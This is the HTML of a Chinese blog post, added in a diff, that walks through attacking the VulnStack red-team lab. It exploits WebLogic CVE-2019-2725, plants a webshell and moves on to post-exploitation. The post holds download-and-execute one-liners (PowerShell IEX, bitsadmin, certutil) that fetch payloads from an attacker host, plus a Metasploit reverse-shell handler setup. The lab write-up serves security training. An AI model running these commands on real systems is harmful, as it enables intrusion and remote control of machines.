@@ -1,0 +1,1482 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="环境配置 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS re">
+<meta name="keywords" content="Web安全，移动安全，windows安全，漏洞挖掘，代码审计，智能合约">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnStack域环境靶场渗透">
+<meta property="og:url" content="https://wh0ale.github.io/2019/12/11/VulnStack域环境靶场渗透/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="环境配置 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS re">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_22-26-39.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-11_20-24-36.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-11_20-25-45.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/1576067526749.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-11_20-28-25.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-12_19-48-21.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-12_19-51-15.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-12_19-56-49.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-12_20-02-42.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-12_20-06-25.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-12_20-12-12.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-12_20-16-09.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-12_20-22-07.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_12-46-13.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_13-42-02.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_13-45-33.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_16-53-17.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_14-15-01.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_14-20-42.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_15-04-27.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_15-30-17.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_16-01-09.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-16_14-02-34.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-16_14-42-52.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-16_14-45-27.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_19-44-39.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_19-58-06.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_19-59-04.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-14_23-22-48.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_22-11-59.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_22-26-38.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_13-34-24.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_13-36-10.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_13-25-57.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_13-48-45.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_14-06-08.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_15-06-52.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_15-08-04.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_16-38-19.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_16-41-11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_17-27-37.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_17-32-38.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_21-55-27.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-16_11-54-35.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-16_11-58-36.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-16_12-42-02.png">
+<meta property="og:updated_time" content="2019-12-16T09:57:17.313Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="VulnStack域环境靶场渗透">
+<meta name="twitter:description" content="环境配置 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS re">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_22-26-39.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/12/11/VulnStack域环境靶场渗透/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>VulnStack域环境靶场渗透 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/12/11/VulnStack域环境靶场渗透/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">VulnStack域环境靶场渗透
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-12-11 20:21:05" itemprop="dateCreated datePublished" datetime="2019-12-11T20:21:05+08:00">2019-12-11</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-12-16 17:57:17" itemprop="dateModified" datetime="2019-12-16T17:57:17+08:00">2019-12-16</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">32k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">29 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-15_22-26-39.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。关于靶场统一登录密码：1qaz@WSX</span><br><span class="line"></span><br><span class="line">Bypass UAC</span><br><span class="line"></span><br><span class="line">Windows系统NTLM获取（理论知识：Windows认证）</span><br><span class="line"></span><br><span class="line">Access Token利用（MSSQL利用）</span><br><span class="line"></span><br><span class="line">WMI利用</span><br><span class="line"></span><br><span class="line">网页代理，二层代理，特殊协议代理（DNS，ICMP）</span><br><span class="line"></span><br><span class="line">域内信息收集</span><br><span class="line"></span><br><span class="line">域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用</span><br><span class="line"></span><br><span class="line">域凭证收集</span><br><span class="line"></span><br><span class="line">后门技术（黄金票据/白银票据/Sid History/MOF）</span><br><span class="line"></span><br><span class="line">环境说明</span><br><span class="line">内网网段：10.10.10.1/24</span><br><span class="line"></span><br><span class="line">DMZ网段：192.168.111.1/24</span><br><span class="line"></span><br><span class="line">测试机地址：192.168.111.1（Windows），192.168.111.11（Linux）</span><br><span class="line"></span><br><span class="line">防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问）：</span><br><span class="line"></span><br><span class="line">deny all tcp ports：10.10.10.1</span><br><span class="line">allow all tcp ports：10.10.10.0/24</span><br><span class="line">配置信息</span><br><span class="line"></span><br><span class="line">DC</span><br><span class="line">IP：10.10.10.10 </span><br><span class="line">OS：Windows 2012(64)</span><br><span class="line">应用：AD域</span><br><span class="line"></span><br><span class="line">WEB</span><br><span class="line">IP1：10.10.10.80 </span><br><span class="line">IP2：192.168.111.80 </span><br><span class="line">OS：Windows 2008(64)</span><br><span class="line">应用：Weblogic 10.3.6 MSSQL 2008</span><br><span class="line"></span><br><span class="line">PC</span><br><span class="line">IP1：10.10.10.20 1</span><br><span class="line">IP2：192.168.111.201 </span><br><span class="line">OS：Windows 7(32)</span><br><span class="line"></span><br><span class="line">攻击机</span><br><span class="line">IP：192.168.111.1</span><br><span class="line">OS：Windows 10(64)</span><br><span class="line">IP：192.168.111.3 </span><br><span class="line">OS：Kali(64)</span><br></pre></td></tr></table></figure>
+
+<p>VMware workstation 15 配置为host only（相当于VMware虚拟一个局域网，类似于nat模式。但是这个局域网没有连互联网。）</p>
+<p>设置为host only 旨在模拟真实环境</p>
+<p>添加网卡VMnet1</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-11_20-24-36.png" alt></p>
+<p>在控制面板配置VMnet1的<code>IP地址</code> <code>子网掩码</code> <code>默认网关</code>，将此处网络配置为10段</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-11_20-25-45.png" alt></p>
+<p><strong>DC域控网络配置</strong></p>
+<p>DC域控将网络适配器调整为VMnet1(host only)，然后配置网络如下</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/1576067526749.png" alt></p>
+<p>可以看到已经和域环境ping通了</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-11_20-28-25.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IP1：10.10.10.10(host only模式VMnat1)</span><br><span class="line">网关: 10.10.10.1</span><br><span class="line">OS：OS：Windows Server 2012 R2(64)</span><br></pre></td></tr></table></figure>
+
+<p>接下来配置PC个人端和WEB端</p>
+<p><strong>PC个人端</strong></p>
+<p>网络适配器2设置为 host only 模拟内网域环境</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-12_19-48-21.png" alt></p>
+<p>接下来设置另一个网络适配器 为nat模式</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-12_19-51-15.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IP1：10.10.10.201(host only模式VMnat1)</span><br><span class="line">IP2：192.168.111.201(nat模式)</span><br><span class="line">OS：Windows 7旗舰版</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-12_19-56-49.png" alt></p>
+<p><strong>web端</strong></p>
+<p>和PC端一样的设置</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-12_20-02-42.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IP1：10.10.10.80(host only模式VMnat1)</span><br><span class="line">IP2：192.168.111.80(nat模式)</span><br><span class="line">OS：OS：Windows Server 2008 R2(64)</span><br></pre></td></tr></table></figure>
+
+<p>在<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code>目录下存在三个批处理文件<code>setDomainEnv</code>，<code>startManagedWebLogic</code>，<code>stopManagedWebLogic</code>。点击配置weblogic环境。</p>
+<p>命令行下setDomainEnv 然后startManagedWebLogic 可以看到192.168.211.80已经配置好了weblogic环境，版本号为<strong>10.3.6.0</strong>，大概率存在cve-2019-2725这个漏洞</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-12_20-06-25.png" alt></p>
+<p>分割线（成了......原来有三个快照......我网络配置了三天，中间还出现密码不对的情况，真的是快把我给劝退了，原来下载好就可以运行的靶机折腾了这么久）</p>
+<h1 id="cve-2019-2725"><a href="#cve-2019-2725" class="headerlink" title="cve-2019-2725"></a>cve-2019-2725</h1><p>使用lufeirider老哥写的<a href="https://github.com/lufeirider/CVE-2019-2725" target="_blank" rel="noopener">工具</a> 命令回显探测是否存在cve-2019-2725漏洞</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-12_20-12-12.png" alt></p>
+<p>然后burp发送payload RCE，但是burp弹出报错<code>java.net.SocketException: Connection reset by peer: socket write error</code>，之前在公网测试的时候还可以正常发paylaod，到了自己搭建的域环境就不行，于是我根据网上的方法下载了<a href="https://www.oracle.com/technetwork/java/javase/downloads/jce8-download-2133166.html" target="_blank" rel="noopener">JCE拓展</a>，解压得到两个jar文件，把他放在<code>%JAVA_HOME/jre/lib/security</code>目录中覆盖，再到<code>Project option</code>中设置SSL</p>
+<blockquote>
+<p>在SSL标签中，先把默认的</p>
+<p>Use the default protocols and ciphers of your java installation<br>选项改为</p>
+<p>Use custom protocols and ciphers</p>
+<p>然后就多出两个复选框，一个是选择支持的SSL协议，一个是加密算法，都全部勾选。最后再勾选</p>
+<p>Allow unsafe renegotiation (required for some client certificate)</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-12_20-16-09.png" alt></p>
+<p>全部设置完后还是无效，放弃burp发包，找到直接上传webshell的<a href="https://github.com/TopScrew/CVE-2019-2725" target="_blank" rel="noopener">脚本</a></p>
+<p>访问<a href="http://192.168.111.80:7001//bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig" target="_blank" rel="noopener">http://192.168.111.80:7001//bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig</a></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-12_20-22-07.png" alt></p>
+<p>我想到用Cobalt Strike 拿到图形化的shell</p>
+<p><strong>powershell</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;http://192.168.111.3:81/a&apos;))&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>bitadmin</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c bitsadmin /transfer ce71 http://192.168.111.2:80/a %APPDATA%\ce71.exe&amp;%APPDATA%\ce71.exe&amp;del %APPDATA%\ce71.exe</span><br></pre></td></tr></table></figure>
+
+<p><strong>certutil</strong></p>
+<p>尝试<strong>Windows Executable</strong> 生成可执行exe木马或者<strong>Windows Executable(S)</strong> 生成无状态的可执行exe木马，放在80端口。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe &amp; shell.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_12-46-13.png" alt></p>
+<p>拿到shell还是administrator权限的。</p>
+<blockquote>
+<p>这里一直web服务端一直连不上我的物理机，后面修改了默认网关为192.168.111.1就行了。修改了默认网关后物理机 &lt;-&gt; 服务端的80端口（192.168.111.80:80）, 物理机可以ping通虚拟机服务端(192.168.111.80)，但是虚拟机服务端无法ping通物理机。</p>
+</blockquote>
+<p>或者使用smb共享的shell复制到目标机</p>
+<p>kali(192.168.111.3)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver share `pwd`</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.111.80:7001//bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=copy \\192.168.111.3\share\shell.jsp servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\shell.jsp</span><br></pre></td></tr></table></figure>
+
+<p>但是之前上传的webshell无法使用copy等一些共享命令，所以不采用这种方法。</p>
+<p><strong>将图形化shell 派生到meterpreter</strong></p>
+<p>1.cs设置一个foreign的listener，监听端口为5555</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_13-42-02.png" alt></p>
+<p>2.msfconsole 设置如下，然后在CS客户端的shell下右键点击<code>spawn</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.111.3</span><br><span class="line">lhost =&gt; 192.168.111.3</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 5555</span><br><span class="line">lport =&gt; 5555</span><br><span class="line">msf5 exploit(multi/handler) &gt; show options</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-13_13-45-33.png" alt></p>
+<h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><p>1、获取当前组的计算机名(一般remark有Dc可能是域控)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>
+
